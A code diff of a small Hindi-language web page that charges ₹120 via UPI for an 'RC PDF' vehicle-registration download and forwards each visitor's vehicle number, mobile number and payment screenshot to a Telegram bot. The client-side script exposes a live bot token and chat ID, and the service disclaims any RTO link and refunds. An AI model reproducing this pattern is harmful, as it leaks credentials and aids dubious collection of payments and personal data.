@@ -5,129 +5,165 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Mishra Insurance Service</title>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
 body{
+background:linear-gradient(45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
 min-height:100vh;
-background:linear-gradient(-45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
-background-size:400% 400%;
-animation:bgMove 8s ease infinite;
-display:flex;flex-direction:column;align-items:center;color:#fff;
-}
-@keyframes bgMove{
-0%{background-position:0% 50%}
-50%{background-position:100% 50%}
-100%{background-position:0% 50%}
+display:flex;
+justify-content:center;
+align-items:center;
+color:#fff;
 }
 .card{
-margin-top:110px;width:92%;max-width:420px;
 background:rgba(255,255,255,0.15);
-backdrop-filter:blur(15px);
-padding:30px;border-radius:20px;text-align:center;
+padding:25px;
+border-radius:15px;
+width:90%;
+max-width:400px;
+text-align:center;
 }
-input{width:100%;padding:14px;margin-top:12px;border-radius:12px;border:none}
-.neonBtn{
-width:100%;padding:14px;margin-top:14px;border:none;border-radius:12px;
-background:#111;color:#fff;cursor:pointer;
+input{
+width:100%;
+padding:12px;
+margin-top:10px;
+border:none;
+border-radius:8px;
+}
+button{
+width:100%;
+padding:12px;
+margin-top:12px;
+border:none;
+border-radius:8px;
+background:#000;
+color:#fff;
+cursor:pointer;
+}
+.qr{
+width:180px;
+margin-top:10px;
 }
 .hidden{display:none}
-.qr{width:180px;margin-top:15px;border-radius:12px}
 </style>
-</head>
 
+</head>
 <body>
 
 <div class="card">
 
 <div id="page1">
-<h2>Enter Vehicle Number</h2>
+<h2>वाहन नंबर दर्ज करें</h2>
 <input id="vehicle" placeholder="BR-09-AB-1234">
-<button class="neonBtn" onclick="goNext()">Continue</button>
+<button onclick="nextPage()">आगे बढ़ें</button>
 </div>
 
 <div id="page2" class="hidden">
-<h2>Service Fee ₹120</h2>
+<h2>सेवा शुल्क ₹120</h2>
 
-<button class="neonBtn"
-onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120&cu=INR&tn=RC%20PDF'">
-Pay ₹120
-</button>
+<button onclick="payUPI()">₹120 भुगतान करें</button>
 
 <img class="qr"
-src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120&cu=INR&tn=RC%20PDF">
+src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26pn%3DBest%20Insurance%26am%3D120%26cu%3DINR%26tn%3DRC%20PDF">
 
-<input id="mobile" placeholder="Mobile Number">
+<input id="mobile" placeholder="मोबाइल नंबर">
 <input type="file" id="proof">
 
-<button class="neonBtn" onclick="submitForm()">Submit</button>
+<button onclick="submitForm()">सबमिट करें</button>
 </div>
 
 </div>
+
+<!-- PDF Library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 
 <script>
 
-function goNext(){
-if(!vehicle.value){alert("Enter vehicle");return;}
+function nextPage(){
+if(!vehicle.value){
+alert("कृपया वाहन नंबर दर्ज करें");
+return;
+}
 page1.classList.add("hidden");
 page2.classList.remove("hidden");
 }
 
-/* ===== PDF FUNCTION ===== */
+function payUPI(){
+window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120&cu=INR&tn=RC%20PDF";
+}
+
+/* ===== PDF बनाना ===== */
 function downloadPDF(){
+
+if(!window.jspdf){
+alert("PDF लोड नहीं हुआ");
+return;
+}
+
 const { jsPDF } = window.jspdf;
 const doc = new jsPDF();
 
 let v = vehicle.value;
 let m = mobile.value;
 
-// Title
+// शीर्षक
+doc.setFillColor(0,102,204);
+doc.rect(0,0,210,20,"F");
+
+doc.setTextColor(255,255,255);
 doc.setFontSize(14);
-doc.setTextColor(0,102,204);
-doc.text("RCPDF.IN",105,15,null,null,"center");
+doc.text("RCPDF.IN",105,13,null,null,"center");
 
-// Heading
-doc.setFontSize(12);
+// हेडिंग
 doc.setTextColor(0,0,0);
-doc.text("RC DOWNLOAD REQUEST",105,25,null,null,"center");
+doc.setFontSize(12);
+doc.text("RC डाउनलोड अनुरोध",105,30,null,null,"center");
 
-// User Info
+// जानकारी
 doc.setFontSize(11);
-doc.text("Vehicle Number: "+v,20,40);
-doc.text("Mobile Number: "+m,20,48);
-doc.text("Work: RC Download",20,56);
+doc.text("वाहन नंबर: "+v,20,50);
+doc.text("मोबाइल नंबर: "+m,20,60);
+doc.text("कार्य: RC डाउनलोड",20,70);
 
-// Message
+// संदेश
 doc.setFontSize(10);
-doc.text("Aapko RC ki PDF jald hi aapke number "+m+" par bhej diya jayega.",20,70);
+doc.text("आपको RC की PDF जल्द ही आपके मोबाइल नंबर "+m+" पर भेज दी जाएगी।",20,85);
 
-// Line
-doc.line(20,75,190,75);
+// लाइन
+doc.line(20,90,190,90);
 
-// Disclaimer
+// नियम और शर्तें
 doc.setFontSize(7);
-let y=85;
 
-doc.text("• Ye website kisi bhi tarah se RTO se juda nahi hai",20,y); y+=5;
-doc.text("• Hum jaankari ki sahi hone ki koi guarantee nahi dete",20,y); y+=5;
-doc.text("• Ye sirf jaankari purpose ke liye hai",20,y); y+=5;
-doc.text("• Galat istemal ki jimmedari user ki hogi",20,y); y+=5;
-doc.text("• Payment ke baad refund nahi milega",20,y); y+=5;
-doc.text("• Payment karna matlab user sabhi sharton se sehmat hai",20,y);
+let y=100;
+
+doc.text("• यह वेबसाइट किसी भी प्रकार से RTO से जुड़ी नहीं है",20,y); y+=5;
+doc.text("• हम जानकारी की पूरी तरह सही होने की पुष्टि नहीं करते",20,y); y+=5;
+doc.text("• यह साइट केवल जानकारी के उद्देश्य से बनाई गई है",20,y); y+=5;
+doc.text("• किसी भी गलत उपयोग की जिम्मेदारी उपयोगकर्ता की होगी",20,y); y+=5;
+doc.text("• भुगतान के बाद राशि वापस नहीं की जाएगी",20,y); y+=5;
+doc.text("• भुगतान करने का अर्थ है कि उपयोगकर्ता सभी शर्तों से सहमत है",20,y);
 
 doc.save("RC_PDF_Request.pdf");
 }
 
-/* ===== SUBMIT ===== */
+/* ===== सबमिट ===== */
 function submitForm(){
-if(mobile.value.length<10){alert("Enter valid mobile");return;}
-if(!proof.files[0]){alert("Upload screenshot");return;}
 
-// PDF download
+if(mobile.value.length<10){
+alert("सही मोबाइल नंबर दर्ज करें");
+return;
+}
+
+if(!proof.files[0]){
+alert("कृपया स्क्रीनशॉट अपलोड करें");
+return;
+}
+
+// PDF डाउनलोड
 downloadPDF();
 
-// Telegram send (same as your system)
+// Telegram भेजना
 let data=new FormData();
 data.append("chat_id","5600045707");
 data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
@@ -136,7 +172,7 @@ data.append("photo",proof.files[0]);
 fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",
 {method:"POST",body:data});
 
-alert("Submitted Successfully ✅");
+alert("सफलतापूर्वक सबमिट हुआ");
 }
 
 </script>
